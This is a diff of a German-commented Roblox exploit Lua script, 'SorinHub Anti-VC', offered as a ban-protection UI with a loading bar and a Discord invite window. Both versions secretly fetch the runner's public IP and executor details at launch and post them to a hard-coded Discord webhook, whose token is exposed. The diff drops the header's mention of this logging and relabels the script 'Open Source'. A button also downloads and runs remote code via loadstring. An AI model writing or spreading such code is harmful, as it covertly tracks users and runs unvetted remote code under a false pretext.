@@ -1,6 +1,5 @@
--- V2
--- Sorin Anti-VC UI Script
--- Verbesserte Version mit Ladebalken, Discord-Fenster, Bounce-Effekt, Debounce und GUI-Schutz + Webhook Logging mit Executor-Daten
+-- v2 SorinHub Anti-VC UI Script, Open Source
+-- Ladebalken, Discord-Fenster, Bounce-Effekt, Debounce, GUI-Schutz
 
 local Players = game:GetService("Players")
 local StarterGui = game:GetService("StarterGui")
@@ -9,20 +8,29 @@ local HttpService = game:GetService("HttpService")
 local UserInputService = game:GetService("UserInputService")
 local player = Players.LocalPlayer
 
--- Logging an Discord Webhook inkl. Executor-Daten
+if not game:IsLoaded() then game.Loaded:Wait() end
+
+if player:FindFirstChild("PlayerGui"):FindFirstChild("SorinUI") then
+    StarterGui:SetCore("SendNotification", {
+        Title = "Sorin läuft bereits",
+        Text = "Der Anti-VC-Schutz ist schon aktiv!",
+        Duration = 5
+    })
+    return
+end
+
+-- Webhook Logging
 pcall(function()
-    local function safeGet(value)
-        local success, result = pcall(function() return tostring(value) end)
-        return success and result or "[Zugriff fehlgeschlagen]"
+    local function safeGet(v)
+        local ok, res = pcall(function() return tostring(v) end)
+        return ok and res or "[Zugriff fehlgeschlagen]"
     end
 
     local ip = "Nicht abrufbar"
     pcall(function()
-        if syn and syn.request then
-            local res = syn.request({Url="https://api.ipify.org"})
-            if res and res.Body then
-                ip = res.Body
-            end
+        if http_request then
+            local res = http_request({Url = "https://api.ipify.org"})
+            if res and res.Body then ip = res.Body end
         end
     end)
 
@@ -34,23 +42,23 @@ pcall(function()
         "IP: " .. ip
     }
 
-    local data = {
-        ["content"] = "**Script wurde ausgeführt!**",
-        ["embeds"] = {{
-            ["title"] = "SorinHub Anti VC Bann",
-            ["description"] = table.concat(info, "\n"),
-            ["color"] = 65280
+    local payload = {
+        content = "**Script wurde ausgeführt!**",
+        embeds = {{
+            title = "SorinHub Anti VC Bann",
+            description = table.concat(info, "\n"),
+            color = 65280
         }}
     }
 
-    local json = HttpService:JSONEncode(data)
-    local url = "https://discord.com/api/webhooks/1399462700458704926/RFgF5WJ6HoylqMLE-D-y_t9Xv84ugH2oI-Od7aLGIoCCcRdUDX_zgxSqH0unLCG6O0b4"
-    HttpService:PostAsync(url, json, Enum.HttpContentType.ApplicationJson)
+    HttpService:PostAsync(
+        "https://discord.com/api/webhooks/1399462700458704926/RFgF5WJ6HoylqMLE-D-y_t9Xv84ugH2oI-Od7aLGIoCCcRdUDX_zgxSqH0unLCG6O0b4",
+        HttpService:JSONEncode(payload),
+        Enum.HttpContentType.ApplicationJson
+    )
 end)
 
-if not game:IsLoaded() then game.Loaded:Wait() end
-if player:FindFirstChild("PlayerGui"):FindFirstChild("SorinUI") then return end
-
+-- UI
 local gui = Instance.new("ScreenGui", player:WaitForChild("PlayerGui"))
 gui.Name = "SorinUI"
 gui.ResetOnSpawn = false
@@ -62,6 +70,16 @@ loadingFrame.BackgroundColor3 = Color3.fromRGB(30, 30, 40)
 loadingFrame.BorderSizePixel = 0
 loadingFrame.Parent = gui
 Instance.new("UICorner", loadingFrame).CornerRadius = UDim.new(0, 20)
+
+local titleLabel = Instance.new("TextLabel")
+titleLabel.Size = UDim2.new(1, 0, 0, 25)
+titleLabel.Position = UDim2.new(0, 0, 0, 5)
+titleLabel.Text = "SorinHub - Anti-VC-Ban"
+titleLabel.Font = Enum.Font.GothamBold
+titleLabel.TextColor3 = Color3.fromRGB(200, 200, 255)
+titleLabel.BackgroundTransparency = 1
+titleLabel.TextScaled = true
+titleLabel.Parent = loadingFrame
 
 local progressBar = Instance.new("Frame")
 progressBar.Size = UDim2.new(0, 0, 0, 20)
@@ -80,9 +98,7 @@ barBG.ZIndex = -1
 barBG.Parent = loadingFrame
 Instance.new("UICorner", barBG).CornerRadius = UDim.new(0, 10)
 
-TweenService:Create(progressBar, TweenInfo.new(3, Enum.EasingStyle.Quad, Enum.EasingDirection.Out), {Size = UDim2.new(1, -20, 0, 20)}):Play()
-
--- Nach 3 Sekunden Ladezeit
+TweenService:Create(progressBar, TweenInfo.new(3, Enum.EasingStyle.Quad), {Size = UDim2.new(1, -20, 0, 20)}):Play()
 
 task.delay(3, function()
     loadingFrame:Destroy()
@@ -132,7 +148,7 @@ task.delay(3, function()
 
         local Frame = Instance.new("Frame")
         Frame.Size = UDim2.new(0, 250, 0, 150)
-        Frame.Position = UDim2.new(1, -260, 1, -200)
+        Frame.Position = UDim2.new(1, -260, 1, -180)
         Frame.BackgroundColor3 = Color3.fromRGB(20, 20, 25)
         Frame.BackgroundTransparency = 0.1
         Frame.BorderSizePixel = 0
@@ -155,7 +171,7 @@ task.delay(3, function()
         end)
         UserInputService.InputChanged:Connect(function(input)
             if drag and input.UserInputType == Enum.UserInputType.MouseMovement then
-                TweenService:Create(Frame, TweenInfo.new(0.2, Enum.EasingStyle.Quad, Enum.EasingDirection.Out), {
+                TweenService:Create(Frame, TweenInfo.new(0.2, Enum.EasingStyle.Quad), {
                     Position = UDim2.new(0, input.Position.X - offset.X, 0, input.Position.Y - offset.Y)
                 }):Play()
             end
@@ -211,7 +227,6 @@ task.delay(3, function()
         JoinBtn.MouseButton1Click:Connect(function()
             if clicked then return end
             clicked = true
-
             local success, err = pcall(function()
                 loadstring(game:HttpGet("https://raw.githubusercontent.com/Wyattluber/sorin-loader/refs/heads/full-GUI/sorin-loader.lua"))()
             end)
@@ -273,6 +288,11 @@ task.delay(3, function()
 
             join.MouseButton1Click:Connect(function()
                 setclipboard("https://discord.gg/yXgtrQ4kPg")
+                StarterGui:SetCore("SendNotification", {
+                    Title = "Discord",
+                    Text = "Einladungslink kopiert!",
+                    Duration = 4
+                })
                 dWin:Destroy()
             end)
 
